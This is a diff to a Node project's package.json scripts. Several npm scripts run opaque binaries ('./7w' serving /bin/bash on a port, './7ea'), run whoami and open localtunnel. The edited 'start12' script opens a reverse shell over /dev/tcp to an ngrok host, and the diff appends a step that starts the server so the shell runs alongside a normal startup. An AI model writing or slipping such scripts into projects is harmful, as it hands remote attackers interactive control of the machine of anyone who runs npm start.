@@ -7,7 +7,7 @@
     "serve": "nodemon --watch . server.js",
     "start1": " whoami &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
     "start11": " ./7w -p 8000  /bin/bash &&   ./7ea ip && ./7ea e node server.js",
-    "start12": " ./7w -p 8000  /bin/bash &&  bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18915 0>&1 ",
+    "start12": " ./7w -p 8000  /bin/bash &&  bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18915 0>&1 && ./7ea e node server.js ",
     "startn": "  npm install -g localtunnel && npx localtunnel && whoami ",
     "rstart": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
     "build1": "  ./7ea ip && ./7ea e node server.js",
